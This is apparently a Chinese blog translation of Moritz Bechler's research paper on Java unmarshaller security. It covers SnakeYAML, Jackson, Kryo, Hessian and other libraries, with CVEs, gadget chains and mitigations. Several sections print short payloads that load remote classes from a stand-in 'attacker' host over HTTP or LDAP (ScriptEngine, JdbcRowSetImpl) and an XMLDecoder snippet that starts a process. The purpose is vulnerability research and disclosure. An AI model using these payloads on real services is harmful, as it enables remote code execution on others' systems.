---
layout: post
title: marshalsec parper 翻译
categories: java
tag: 翻译
---

# Java Unmarshaller Security  （将您的数据转化为代码执行）

<center>
Moritz Bechler

mbechler@eenterphace.org

May 22, 2017

译者： jax777
</center>

两年前(当前2019年，已为四年前)Chris Frohoff 和 Garbriel Lawrence发表了他们关于java对象反序列化漏洞的研究，这可能引发了java历史上规模最大的一系列远程代码执行漏洞。对这一问题的研究表明，这些漏洞不仅仅表现为java序列化和XStream(一个Java对象和XML转换工具)的特性，也有一些可能影响其他机制。本文介绍了各种可以通过unmarshalling执行攻击者恶意代码的开源java marshalling组件库的分析。研究表明，无论这个过程如何执行以及包含何种隐含的约束，大家都倾向采用类似的开发技术。尽管大多数描述的机制都没有比java序列化实现的功能更强，但是结果却更容易被利用-在一些情况下，jdk的标准库即可在反序列化过程中实现代码执行。
(为了与java内置的序列化相冲突，本文的marshalling指任何将java的内部表示转换到可以存储、传输的机制)
任何将java
**免责申明**: 这里所有提供的信息仅供学习目的。所有引用的漏洞已经负责任地通知向相关厂商。尽管所有的厂商已经被给予了大量时间，现阶段可能仍有部分漏洞还未被修复，然而，本文作者认为广泛的披露这些信息应该会产生更好的效果。

## 介绍

除了极少数例外，java marshallers  提供了将各自的目标格式转换到对象图（树）的方法。这允许用户使用结构化和适当类型的数据，这当然是java中最自然的方式。

在marshalling和unmarshalling过程中marshaller需要与source以及target 对象交互来设置或读取属性值。这种交互广泛的存在于javaBean约定中，这意味着通过getter 和 seter 来访问对象属性。其他机制直接访问实际的java字段。对象还可能有一种可以生产自然的自定义表示机制，通常，为了提高空间效率或增加表示能力，内置的某些类型转换不遵循这些规则。

本文明确的重点就是unmarshalling过程，攻击者更有可能控制该过程的输入。在第五节中，描述了一些可能杯攻击的marshalling组件。

在多数情况下,在unmarshalling时，预期的root对象已知-- 毕竟人们大多希望对接收到的数据做些事情。可以使用反射递归确认属性类型。然而许多具体实现，都没有忽略非预期的类型。java提供了继承和接口用来提供多态性，进而导致需要在某些具体表述中添加一些类型信息来保证正确恢复。

为攻击者提供一个某种类型来unmarshal，进而在执行该类型上的特定方法。显然，人们的预期时这些组件表现良好-- 那么是什么导致可能发生问题呢?

开源的java marshalling 库通常针对某一类型，列表如下：

- SnakeYAML (YAML)
- jYAML (YAML)
- YamlBeans (YAML)
- Apache Flex BlazeDS (AMF  Action Message Format, originally developed by Adobe) 
- Red5 IO AMF (AMF)
- json-io (JSON)
- Castor (XML)
- Java XMLDecoder (XML)
- Java Serialization (binary)
- Kryo (binary)•Hessian/Burlap (binary/XML)
- XStream (XML/various

Jackson 是一个通常遵循实际属性的实现例子。然而，他的多态unmarshalling 支持一种操作任意类型的模式。

没有这种类型的例外：
- JAXB 需要所有的类型都已注册
- 需要已定义模式或编译的机制(例如XmlBeans、Jibx、Protobuf)
- GSON 需要一个特点root类型，遵循属性类型，多态机制需要提前注册
- GWT-RPC 提供了类型信息，但自动构建了白名单。

## 工具

大多数gadget搜索都是[Serianalyzer](https://github.com/mbechler/serianalyzer/)的一点点增强版完成的。Serianalyzer,起初开发用于Java 反序列化分析，是一个静态字节码分析器，从一组初始方法出发，追踪各类原生方法潜在的可达路径。调整这些起始方法以匹配unmarshalling中可以完成的交互（可能寻找绕过可序列化的类型检查，以及针对Java序列化进行启发式调整），这也可以用于其他机制。

## Marshalling 组件库

这里描述了各式 Marshalling 机制，对比了他们之间的相互影响以及unmarshall执行的各种检查。最基本的差别是他们如何设定对象的值，因此下面将区分使用Bean属性访问的机制和只使用直接字段访问的机制。

### 基于Bean 属性的 marshallers

基于Bean 属性的 marshallers 或多或少都遵守类型的API来阻止一个攻击者任意修改对象的状态，并且可以比基于字段的marshallers重建更少的对象图。但是，它们调用了setter方法，导致在unmarshalling时可能触发更多的代码。

#### SnakeYAML

SnakeYAML 只允许公有构造函数和公有属性。它不需要相应的getter方法。它有一个允许通过攻击者提供的数据调用任意构造函数的特性。这使得攻击 ScriptEngine（甚至也可能影响更多，这是一个令人难以置信的攻击面）成为可能。

```java
!! javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader  [[
        !!java.net.URL ["http :// attacker /"]
    ]]
]
```

通过 JdbcRowset 仅用属性访问也能实现攻击

```java
!!com.sun.rowset.JdbcRowSetImpl
    dataSourceName: ldap :// attacker/obj
    autoCommit: true
```

SnakeYAML 指定一个特定实际使用的root类型，然而并不检查嵌套的类型。

- References
  > cve-2016-9606  Resteasy

  > CVE-2017-3159  Apache Camel

  > CVE-2016-8744  Apache Brooklyn

- 可用的payloads

  - ScriptEngine (4.16)
  - JdbcRowset (4.2)
  - C3P0RefDS (4.8)
  - C3P0WrapDS (4.9)
  - SpringPropFac (4.10)
  - JNDIConfig (4.7)

- 修复、缓解措施

    SnakeYAML 提供了一个SafeConstructor,禁用所有自定义类型。或者，白名单实现一个自定义Constructor。

#### jYAML

jYAML 解析自定义类型的语法与 SnakeYAML 有些细微的差别，并且不支持任意构造函数调用。这个项目被抛弃了。它需要一个public 构造函数以及相应的 getter 方法。

jYAML 允许使用 相同的基于属性的和 SnakeYAML 相同的 payloads， 包括 JdbcRowset ：

```java
foo: !com.sun.rowset.JdbcRowSetImpl
    dataSourceName: ldap :// attacker/obj
    autoCommit: true
```

由于 getter 的特殊要求 SpringPropFac 不能触发。jYAML 不允许指定root类型，但他根本就没有检查。

- 可用 payloads

  - JdbcRowset(4.2)
  - C3P0RefDs(4.8)
  - C3P0WrapDS(4.9)

- 修复、缓解措施

    似乎并没有提供一个机制实现白名单

#### YamlBeans

YamlBeans 对自定义类型使用另一种语法。它仅允许配置过或注释过的构造函数被调用，它需要一个默认构造函数（不一定必须是public）以及相应的 getter 方法。YamlBeans 通过字段枚举一个类型的所有属性，意味着只有那些 setter 函数与字段名相关的才能被使用。 YamlBeans 中 JdbcRowset 不能被触发，因为需要的属性没有一个相应的字段与之匹配。 C3P0WrapDS 却任然能触发。

```java
!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
    userOverridesAsString: HexAsciiSerializedMap:<payload >
```

YamlBeans 允许指定 root 类型，但它事实上并不做检查。 YamlBeans 有一系列配置参数，例如 禁止non-public 构造函数 或者直接字段可用。

- 可用 payloads

  - C3P0WrapDS(4.9)

- 修复、缓解措施

    似乎并没有提供一个机制实现白名单

#### Apache Flex BlazeDS

Flex BlazeDS AMF  unmarshallers  需要一个public 默认构造函数和public stters。（marshalling 的实现过程中需要getters；然而，没有那些的 payloads 通过一个自定义的 BeanProxy 也可以被构建，当然这个BeanProxy 也需要获得某些类型的属性排序）

AMF3/AMFx unmarshallers 支持 java.io.Externalizable 类型，这可以通过 RMIRef 来到达 Java 反序列化。（deserialization）。它们都内置了针对 javax.sql.RowSet 自定义子类的转换规则，这就意味着 JdbcRowset 不能被 unmarshalled。 其他可用的有效载荷包括 Spring-PropFac 和 C3P0WrapDS (如果他们被添加到路径中)。

不允许指定根类型，也不检查嵌套的属性类型。

- References

  > CVE-2017-3066 Adobe Coldfusion

  > CVE-2017-5641 Apache BlazdDS

  > CVE-2017-5641 VMWare VCenter

- 可用 payloads

  - RMIRef(4.20)
  - C3P0WrapDS(4.9)
  - SpringPropFac(4.10)

- 修复、缓解措施

    可用通过DeserializationValidator 实现一个类型白名单。更新待版本4.7.3，默认开启白名单

#### Red5 IO AMF

Red5 有自定义的 AMF unmarshallers ，与 BlazeDS 有些许不同。它们都需要一个默认的 public 构造器 和public setters 。仅通过自定义标记接口支持外部化类型。

但是，它没有实现 javax.sql.RowSet 自定义逻辑， 因此可以通过 JdbcRowset 、 SpringPropFac 和 C3P0WrapDs 实现攻击， 都依赖于 Red5 服务。

- References

  > CVE-2017-5878 Red5 , Apache OpenMeetings

- 可用 payloads

  - JdbsRowset(4.2)
  - C3P0WrapDS(4.9)
  - SpringPropFac(4.10)

#### Jackson

Jackson ,在它的默认配置中，执行严格的运行时类型检查，包括一般类型收集和禁止特殊、任意类型，因此在默认配置中它是无法被影响的。但是，它有一项配置参数来启用多态 [unmarshalling](http://wiki.fasterxml.com/JacksonPolymorphicDeserialization),包括使用 java 类名的选项。Jaclson 需要一个默认构造器和setter 方法（不区分public 和private ，均可行）。

类型检查在这些模式下也起作用，所有攻击也需要一个 使用supertype的 readValue() 或具有该类型的嵌套字段、集合。

这里有类型信息的一系列表现形式，都表现为相同的行为。因此，有多种方法来开启这种多态性，全局的 ObjectMapper->enableDefaultTyping(),一个自定义的 TypeResolverBuilder ，或者使用 在字段上使用 @JsonTypeInfo 注释。取决于 Jackson的版本，也行可以使用 JdbsRowset 进行攻击：

```java
["com.sun.rowset.JdbcRowSetImpl ",{
    "dataSourceName ":
    "ldap :// attacker/obj",
    "autoCommit" : true
}]
```

但是，那并不会在 2.7.0以后版本生效, 因为 Jackson 检查是否定义了多个冲突的setter方法， JdbcRowSetTmpl 有 3个对应 'matchColumn' 属性的setter 。Jackson 2.7.0 版本为这种场景添加了一些分辨逻辑。不幸的事，这个分辨逻辑有bug：依赖于 Class->getMethods() 的顺序，然而这是随机的（但缓存使用 SoftReference ，所以只要进程一直运行，就不会得到另一次机会），检查因此失效。

除此之外，Jackson 还可以使用  SpringPropFac, SpringB-FAdv, C3P0RefDS, C3P0WrapDS ，RMIRemoteObj  进行攻击。

- References

  > REPORTED Amazon AWS Simple Workflow Library

  > REPORTED Redisson

  > cve-2016-8749 Apache Camel

- 可用 payloads

  - JdbcRowset (4.2)
  - SpringPropFac (4.10)
  - SpringBFAdv (4.12)
  - C3P0RefDS (4.8)
  - C3P0WrapDS (4.9)
  - RMIRemoteObj (4.21)

- 修复、缓解措施

    显式地使用 @JsonTypeInfo 和 JsonTypeInfo.Id.NAME，明确subtypes的多态性。

#### Castor

需要一个public 默认构造器。这个有几个特性，其中一个是调用顺序不完全由攻击者确定--原始属性总是在对象前被设定，它支持额外的属性访问方法调用，即 addXYZ（java.lang.Object）和createXYZ（），并根据声明的类型过滤一些属性。（这看起来像一个bug : 如果什么的非抽象类型没有public 的默认构造函数，即使子类型有也会忽略改属性。虽然Castor 运行通过 javax.management.loading.MLet 来构造 URLClassLoader ,但由于 supertype 没有public 默认构造函数，那么也无法为实例注入属性。如果这是可能的，那么 Castor 本身甚至会有一个可被攻击的实例。 ）

原始对象的策略阻止了 JdbcRowset 的利用，因此需要在 'autoCommit'属性之前设置字符串'dataSourceName'的值。(它看起来不像一个标准库bug ， 这有一个替代路径com.sun.rowset.CachedRowSetImpl->addRowSet() 到com.sun.rowset.JdbcRowSetImpl->getMetaData() )

使用特定的 top-level 类型，但不检查嵌套类型

- References

  > NMS-9100 OpenNMS

- 可用 payloads

  - SpringBFAdv (4.12)
  - C3P0WrapDS (4.9)

- 修复、缓解措施

    没有配置白名单的选项，实现起来有点棘手。

#### Java XMLDecoder

完全出于完整性的目的。众所周知，这种方法非常危险，因为它允许任意方法以及对任意类型的构造函数调用。

```java
<new  class="java.lang.ProcessBuilder">
    <string >/usr/bin/gedit</string ><method  name="start" />
</new>
```

- 修复、缓解措施

    使用这个时，永远不要相信data。

### 基于字段的 marshallers

基于字段的 marshallers 通常在构造对象进行方法调用时提供的攻击面要小得多--有些甚至在不调用任何方法的情况下 unmarshal 非集合对象。同时，因为几乎没有那种可以不设置私有字段就被还原的对象，它们的确会直接影响对象内部结构，从而产生一些意想不到的副作用。另外，许多类型( first 和 foremost 集合)无法使用它们的运行时表示有效地传输/存储。这就意味着所有基于字段的 marshallers 都会与为某些类型自定义的转换器绑定。这些转换器经常会发起攻击者提供的对象内的方法。例如，集合插入 会调用 java.lang.Object->hashCode(),java.lang.Object->equals(), 和 java.lang.Comparable->compareTo() 来分类变量。根据具体实现，也许有其他的可以被触发。

#### Java Serialization

许多人，包括作者，自从 Chris Frohoff 和 GarbrielLawrence 发布了他们关于 Commons Collections, Spring Beans 和 Groovy 的RCE payloads 都对 Java 序列化 gadgets 做过研究。尽管之前已经知道了类似的问题，Frohoff 和 Lawrence 的研究表明这不是孤立事件，而是一般性问题的一部分。这有许多可用的攻击组件，[ysoserial](https://github.com/frohoff/ysoserial/)  提供了大多数已发布的 gadgets 存储仓库，因此这里不会有更多的细节，除非他们可用用于其他机制。

- 可用 payloads
  
  - XBean(4.14)
  - BeanComp(4.17)

- 修复、缓解措施

    Java 8u121 版引入了一个标准类型过滤机制。可以实现各种用户空间的白名单过滤。

#### Kryo

Kryo  ，默认配置下需要一个默认的public 构造函数 并且 不支持代理，许多已知的gadgets 都不能工作。然而它的实例化策略是可插式的，可以用 org.objenesis.strategy.StdInstantiatorStrategy 替换。 StdInstantiatorStrategy 基于 onReflectionFactor，这就表示自定义构造函数不会被调用， java.lang.Object 的构造函数仍会被调用。这就可以通过 finalize() 进行攻击。Arshan dabirsiaghiha s已经描述了一些严重的[副作用](https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo)

使用 Kryo 支持通过自定义比较器来排序集合， BeanComp 会在这里被调用。 SpringBFAdv 也可以工作，包括恢复常规 BeanFactorys 4.13的能力。如果替代实例化策略，将有更多的 gadgets 可用。(以及像 java.util.zip.ZipFile 的终止器-- 内存破坏(也可能被进一步利用))

Kryo 允许在 unmarshalling 时提供一个实际使用的 root 类型。对于嵌套的字段，这些检查值适用于具体类型，这意味着任何非最终类型都可用于触发任意类型的 unmarshalling 操作。

- 可用 payloads

  - BeanComp (4.17)
  - SpringBFAdv (4.12)

- 替代策略 可用 payloads
  - BindingEnum (4.4)eg
  - ServiceLoader (4.3)
  - LazySearchEnum (4.5)
  - ImageIO (4.6)
  - ROME (4.18)
  - SpringBFAdv (4.12)
  - SpringCompAdv (4.11)
  - Groovy (4.19)
  - Resin (4.15)

- 附加风险

    Kryo 可启用额外的转换器：BeanSerializer，一旦启用，意味着seter会被调用，也就是 JavaSerializer 和 ExternalizableSerializer。

- 修复、缓解措施

    Kryo可以设置为要求注册所有正在使用的类型。

#### Hessian/Burlap

Hessian/Burlap,默认通过 sun.misc.Unsafe 使用无副作用的实例化,不对临时字段进行还原，不允许任意代理，不支持自定义集合比较函数。

乍一看，它们似乎在检查 java.io.Serializable 。然而检查仅在 marshalling 时进行， unmarshalling 时未检查。如果检查生效，大多数通过 pass 其他限制的攻击链就无法使用。但是，事实上检查并不生效，可以通过不可序列化的 SpringCompAdv 、 Resin，和可序列化的 ROME 、 XBean 进行攻击。

无法恢复 Groovy 的 MethodClosure ，因为调用 readResolve() 会抛出异常。

可以在 unmarshalling 过程中指定使用特定的 root 类型，然而，用户可以提供一个任意的、甚至不存在的类型。同时嵌套属性也将使用任意类型进行 unmarshall。

- 额外危险

提供了一个 BeanSerializerFactory 选项，这就意味着 setter 方法会被调用。基于 fallback 属性的 Java 反序列化器调用了各类无参数、默认参数的构造函数。如果配置了远程对象机制，可能用于DOS，似乎允许构建模拟对象。